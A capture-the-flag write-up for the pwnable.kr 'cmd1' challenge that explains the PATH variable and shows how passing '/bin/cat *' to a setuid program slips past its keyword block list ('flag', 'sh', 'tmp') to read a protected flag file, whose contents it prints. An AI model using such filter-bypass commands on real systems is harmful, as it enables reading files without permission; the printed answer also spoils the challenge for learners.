# cmd1

## Description

cmd1 - 1 pt

> Mommy! what is PATH environment in Linux? <br> <br>
> ssh cmd1@pwnable.kr -p2222 (pw:guest)

## Solution

### Background

#### Environment variables

An environment variable is a variable whose value is set outside the program, typically through functionality built into the operating system or microservice. They are part of the environment in which a process runs. Environment variables are a universal mechanism for conveying configuration information to Unix programs. 

#### PATH environment variable

The `PATH` environment variable is a list of directories that the shell searches for executable files. The path environment variable is used to find the executable file that is to be executed when a command is entered. 

### Exploit

When connecting to the server, we first check who are we:

```bash
$ id
uid=1025(cmd1) gid=1025(cmd1) groups=1025(cmd1)
```

Then, we check the avialable files:

```bash
$ ls -l
total 20
-r-xr-sr-x 1 root cmd1_pwn 8513 Jul 14  2015 cmd1
-rw-r--r-- 1 root root      320 Mar 23  2018 cmd1.c
-r--r----- 1 root cmd1_pwn   48 Jul 14  2015 flag
```

Let's take a look at the source code:

```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "flag")!=0;
	r += strstr(cmd, "sh")!=0;
	r += strstr(cmd, "tmp")!=0;
	return r;
}
int main(int argc, char* argv[], char** envp){
	putenv("PATH=/thankyouverymuch");
	if(filter(argv[1])) return 0;
	system( argv[1] );
	return 0;
}
```

The program first sets the `PATH` environment variable to `/thankyouverymuch`. Then, it executes the command that is passed as an argument. However, the program checks if the command contains `flag`, `sh`, or `tmp` and if it does, it returns.

Our goal is to print the flag. However, since the `PATH` environment variable was changed, we can't just call `cat` to print the flag - the shell will not be able to find the executable files. However, we can still use the `cat` command by using the absolute path to the executable file. 

Now that we can use the `cat` commnad, we need to figure out how to print the flag. We can't just `bin/cat flag` because the program checks if the command contains `flag`. However, we can use the `cat` command to print *everything* inside the current directory:

```bash
$ /bin/cat *
```

Givin this command as an argument to the program will print the flag:

```bash
$ ./cmd1 "/bin/cat *"
...
mommy now I get what PATH environment is for :)
```